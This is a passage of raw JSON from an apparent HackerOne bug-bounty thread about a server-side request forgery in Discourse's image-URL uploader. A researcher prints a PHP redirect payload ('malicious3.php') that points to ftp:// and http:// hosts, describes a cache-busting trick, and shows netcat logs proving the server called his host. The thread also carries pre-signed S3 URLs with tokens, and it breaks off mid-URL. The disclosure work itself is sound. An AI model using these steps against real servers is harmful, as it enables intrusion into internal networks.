redirections.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T04:53:23.530Z","updated_at":"2017-05-19T04:58:58.584Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1686911,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@marpo I have been trying to reproduce the protocol error all afternoon with no luck. I have tried with the codes you used above (but with different IPs) but no matter what I do it doesn't access my FTP site as your logs show.\n\nThis agrees with #228851 which indicates that they couldn't get protocol URLs to work. The only thing I can think of is perhaps this was already patched?\n\nCan you please confirm that it is still working, and if so the exact input you used to do it? Because at this point I am out of ideas.\n\n","markdown_message":"\u003cp\u003e\u003ca href=\"/marpo\"\u003e@marpo\u003c/a\u003e I have been trying to reproduce the protocol error all afternoon with no luck. I have tried with the codes you used above (but with different IPs) but no matter what I do it doesn\u0026#39;t access my FTP site as your logs show.\u003c/p\u003e\n\n\u003cp\u003eThis agrees with \u003ca href=\"/reports/228851\"\u003e#228851\u003c/a\u003e which indicates that they couldn\u0026#39;t get protocol URLs to work. The only thing I can think of is perhaps this was already patched?\u003c/p\u003e\n\n\u003cp\u003eCan you please confirm that it is still working, and if so the exact input you used to do it? Because at this point I am out of ideas.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T19:23:05.654Z","updated_at":"2017-05-19T19:23:05.654Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1686912,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@marpo (to be clear, I noticed my *browser* is hitting the FTP as a redirect. It is the server side request that II cannot reproduce.)","markdown_message":"\u003cp\u003e\u003ca href=\"/marpo\"\u003e@marpo\u003c/a\u003e (to be clear, I noticed my \u003cem\u003ebrowser\u003c/em\u003e is hitting the FTP as a redirect. It is the server side request that II cannot reproduce.)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T19:23:44.070Z","updated_at":"2017-05-19T19:23:44.070Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1686942,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hay @discourse_team ,\nI am still able to use the ftp request look the following screens\n\n1. \"before.png\" - I opened new composer and clicked the upload img then switched to url part, then i submited the url to my file \"http://192.168.218.53/malicious3.php\n\nroot@fixyour:/var/www/html# cat /var/www/html/malicious3.php\n\u003c?php\n        header('Location: ftp://192.166.218.53');\n?\u003e\n\nAnd i sent the message. Please note that i showed you my vsftpd.log file with last attempt of\n\"Fri May 19 05:03:26 2017 [pid 12497] [admin] FAIL LOGIN: Client \"::ffff:182.74.27.226\"\n\"\n\n2. \"after.png\" - After the payload was sent the server sent a request to my own server with a ftp request i showed you the last attempt from ip \"64.71.168.198\"\n\nThe try.discourse.org ip address looks similar:\n\nroot@fixyour:/var/www/html# ping try.discourse.org\nPING try.bydiscourse.com (64.71.168.206) 56(84) bytes of data.\n64 bytes from 64.71.168.206: icmp_seq=1 ttl=51 time=174 ms\n64 bytes from 64.71.168.206: icmp_seq=2 ttl=51 time=174 ms\n\nIts looks legit for me as i did not put a port :22 in url so the protocol was accept and the discourse server was auto redirect to protocl :22 by submiting the ftp:// part.\n\nTry to follow my steps on the both screens if u cant reproduce it i can show it on live stream or make an video for you.\n\nCheers afine.pl","markdown_message":"\u003cp\u003eHay \u003ca href=\"/discourse_team\"\u003e@discourse_team\u003c/a\u003e ,\u003cbr\u003e\nI am still able to use the ftp request look the following screens\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u0026quot;before.png\u0026quot; - I opened new composer and clicked the upload img then switched to url part, then i submited the url to my file \u0026quot;\u003ca title=\"http://192.168.218.53/malicious3.php\" href=\"/redirect?url=http%3A%2F%2F192.168.218.53%2Fmalicious3.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://192.168.218.53/malicious3.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eroot@fixyour:/var/www/html# cat /var/www/html/malicious3.php\u003cbr\u003e\n\u0026lt;?php\u003cbr\u003e\n        header(\u0026#39;Location: \u003ca title=\"ftp://192.166.218.53\u0026#39;\" href=\"/redirect?url=ftp%3A%2F%2F192.166.218.53%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eftp://192.166.218.53\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e);\u003cbr\u003e\n?\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eAnd i sent the message. Please note that i showed you my vsftpd.log file with last attempt of\u003cbr\u003e\n\u0026quot;Fri May 19 05:03:26 2017 [pid 12497] [admin] FAIL LOGIN: Client \u0026quot;::ffff:182.74.27.226\u0026quot;\u003cbr\u003e\n\u0026quot;\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u0026quot;after.png\u0026quot; - After the payload was sent the server sent a request to my own server with a ftp request i showed you the last attempt from ip \u0026quot;64.71.168.198\u0026quot;\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe try.discourse.org ip address looks similar:\u003c/p\u003e\n\n\u003cp\u003eroot@fixyour:/var/www/html# ping try.discourse.org\u003cbr\u003e\nPING try.bydiscourse.com (64.71.168.206) 56(84) bytes of data.\u003cbr\u003e\n64 bytes from 64.71.168.206: icmp_seq=1 ttl=51 time=174 ms\u003cbr\u003e\n64 bytes from 64.71.168.206: icmp_seq=2 ttl=51 time=174 ms\u003c/p\u003e\n\n\u003cp\u003eIts looks legit for me as i did not put a port :22 in url so the protocol was accept and the discourse server was auto redirect to protocl :22 by submiting the ftp:// part.\u003c/p\u003e\n\n\u003cp\u003eTry to follow my steps on the both screens if u cant reproduce it i can show it on live stream or make an video for you.\u003c/p\u003e\n\n\u003cp\u003eCheers afine.pl\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T19:42:53.727Z","updated_at":"2017-05-19T19:42:53.727Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":186194,"filename":"before.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/186/194/e523bbdc300dfa0c24ceeea063e5fcca2fab89e8/before.png?response-content-disposition=attachment%3B%20filename%3D%22before.png%22%3B%20filename%2A%3DUTF-8%27%27before.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=8822fca02274090734d67e3d20abd95a25d800939044e48a6e24c9206f72d6c1"},{"id":186193,"filename":"after.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/186/193/1b00dd35c24a79630adafd2b061047f3ceda8ea2/after.png?response-content-disposition=attachment%3B%20filename%3D%22after.png%22%3B%20filename%2A%3DUTF-8%27%27after.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=1e5ecb6bf72f1d5e4710268d0eac0da87f0cc7223be2d3df542edf4f53e11c6d"}],"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1687012,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"But interesting part is that when i use http protocl now for example:\n\n\u003c?php\n        header('Location: http://192.166.218.53');\n?\u003e\n\nThen the request sending by discourse server  is different  then before because in my log file i cannot see a Ruby client request anymore\n\n64.71.168.198 - - [19/May/2017:15:57:04 -0400] \"HEAD / HTTP/1.1\" 200 255 \"-\" \"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36\"\n64.71.168.198 - - [19/May/2017:15:57:04 -0400] \"GET / HTTP/1.1\" 200 11576 \"-\" \"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36\"\n\nLooks like some1 did something with the Ruby client so far.\n","markdown_message":"\u003cp\u003eBut interesting part is that when i use http protocl now for example:\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;?php\u003cbr\u003e\n        header(\u0026#39;Location: \u003ca title=\"http://192.166.218.53\u0026#39;\" href=\"/redirect?url=http%3A%2F%2F192.166.218.53%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://192.166.218.53\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e);\u003cbr\u003e\n?\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eThen the request sending by discourse server  is different  then before because in my log file i cannot see a Ruby client request anymore\u003c/p\u003e\n\n\u003cp\u003e64.71.168.198 - - [19/May/2017:15:57:04 -0400] \u0026quot;HEAD / HTTP/1.1\u0026quot; 200 255 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36\u0026quot;\u003cbr\u003e\n64.71.168.198 - - [19/May/2017:15:57:04 -0400] \u0026quot;GET / HTTP/1.1\u0026quot; 200 11576 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36\u0026quot;\u003c/p\u003e\n\n\u003cp\u003eLooks like some1 did something with the Ruby client so far.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T20:01:49.511Z","updated_at":"2017-05-19T20:01:49.511Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":186197,"filename":"dict.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/186/197/f85845731920148d932015c21d8c60da3b355530/dict.png?response-content-disposition=attachment%3B%20filename%3D%22dict.png%22%3B%20filename%2A%3DUTF-8%27%27dict.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=6291e10811d8e26e15022ae7b25ffd26edf9dd444876149dda2452b35a7a5de6"}],"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1687020,"is_internal":false,"editable":false,"type":"Activities::ExternalUserRemoved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-19T20:03:57.403Z","updated_at":"2017-05-19T20:03:57.403Z","actor":{"username":"mlitchfield","cleared":true,"url":"/mlitchfield","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/748/925210b2e90f4053a786099cc4294119a96157a9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"removed_user":{"url":"/mlitchfield","username":"mlitchfield"},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1687038,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ps.\n\nHere is the old log file from the day i submited the report. The attached screens shows the request to malicious3.php file with redirect i am no longer able to reproduce the Ruby client redirect only the other client that the script use. Looks like some1 already fixed the Ruby request part. but the impact still exists, as my ftp:// requests shows.\n\n","markdown_message":"\u003cp\u003eps.\u003c/p\u003e\n\n\u003cp\u003eHere is the old log file from the day i submited the report. The attached screens shows the request to malicious3.php file with redirect i am no longer able to reproduce the Ruby client redirect only the other client that the script use. Looks like some1 already fixed the Ruby request part. but the impact still exists, as my ftp:// requests shows.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T20:09:54.911Z","updated_at":"2017-05-19T20:09:54.911Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":186205,"filename":"ruby.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/186/205/3e8cd8b251a6004b138968a631322a0de74d06b2/ruby.png?response-content-disposition=attachment%3B%20filename%3D%22ruby.png%22%3B%20filename%2A%3DUTF-8%27%27ruby.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=113291970ea300612712f975b43a10d93628ef044310dbf3b2ed2c3e23558997"}],"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1687045,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is the older log with prove that ruby client was affected.( check attachemnts ). I just noticed and  found out why the Ruby client do not follow my redirect. The impact exists only if you are using unique file name each time.\n\nfor example if we once asked  link \nhttp://192.166.218.53/malicious3.php\n\nthen we need to change the name of our file on server to for example malicious4.php.\n\"http://192.166.218.53/malicious4.php\"\nRuby client is only involved if the file is uploaded for a first time (Ruby_redirect.png) file shows the screen with my log files that i just sent to my own server.\n\nThere is also other option to send the request without editing file name.\n\nEdit the post u already sent  and add to the link an empty parameter for example \n\nESTa [![](http://192.166.218.53/malicious4.php?asd)](http://192.166.218.53/malicious4.php?asd)\n\nThe screen Ruby_netcat shows the output after subimiting the changes to the posts\n\n\nlistening on [any] 1337 ...\n64.71.168.198: inverse host lookup failed: Unknown host\nconnect to [192.166.218.53] from (UNKNOWN) [64.71.168.198] 41325\nGET / HTTP/1.1\nAccept-Encoding: identity\nAccept: */*\nUser-Agent: Ruby\nConnection: close\nHost: 192.166.218.53:1337\n\n\nIf you have problem with reproduce i can show it on live screen for you.","markdown_message":"\u003cp\u003eHere is the older log with prove that ruby client was affected.( check attachemnts ). I just noticed and  found out why the Ruby client do not follow my redirect. The impact exists only if you are using unique file name each time.\u003c/p\u003e\n\n\u003cp\u003efor example if we once asked  link \u003cbr\u003e\n\u003ca title=\"http://192.166.218.53/malicious3.php\" href=\"/redirect?url=http%3A%2F%2F192.166.218.53%2Fmalicious3.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://192.166.218.53/malicious3.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ethen we need to change the name of our file on server to for example malicious4.php.\u003cbr\u003e\n\u0026quot;\u003ca title=\"http://192.166.218.53/malicious4.php\" href=\"/redirect?url=http%3A%2F%2F192.166.218.53%2Fmalicious4.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://192.166.218.53/malicious4.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;\u003cbr\u003e\nRuby client is only involved if the file is uploaded for a first time (Ruby_redirect.png) file shows the screen with my log files that i just sent to my own server.\u003c/p\u003e\n\n\u003cp\u003eThere is also other option to send the request without editing file name.\u003c/p\u003e\n\n\u003cp\u003eEdit the post u already sent  and add to the link an empty parameter for example \u003c/p\u003e\n\n\u003cp\u003eESTa \u003ca href=\"/redirect?url=http%3A%2F%2F192.166.218.53%2Fmalicious4.php%3Fasd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e![](http://192.166.218.53/malicious4.php?asd)\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe screen Ruby_netcat shows the output after subimiting the changes to the posts\u003c/p\u003e\n\n\u003cp\u003elistening on [any] 1337 ...\u003cbr\u003e\n64.71.168.198: inverse host lookup failed: Unknown host\u003cbr\u003e\nconnect to [192.166.218.53] from (UNKNOWN) [64.71.168.198] 41325\u003cbr\u003e\nGET / HTTP/1.1\u003cbr\u003e\nAccept-Encoding: identity\u003cbr\u003e\nAccept: \u003cem\u003e/\u003c/em\u003e\u003cbr\u003e\nUser-Agent: Ruby\u003cbr\u003e\nConnection: close\u003cbr\u003e\nHost: 192.166.218.53:1337\u003c/p\u003e\n\n\u003cp\u003eIf you have problem with reproduce i can show it on live screen for you.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-19T20:13:32.413Z","updated_at":"2017-05-19T20:28:09.874Z","actor":{"username":"mariuszpoplawski","cleared":false,"url":"/mariuszpoplawski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":186216,"filename":"ruby_redirect.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/186/216/6fc1730a49759e1387030151c18bd775992eb4f9/ruby_redirect.png?response-content-disposition=attachment%3B%20filename%3D%22ruby_redirect.png%22%3B%20filename%2A%3DUTF-8%27%27ruby_redirect.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX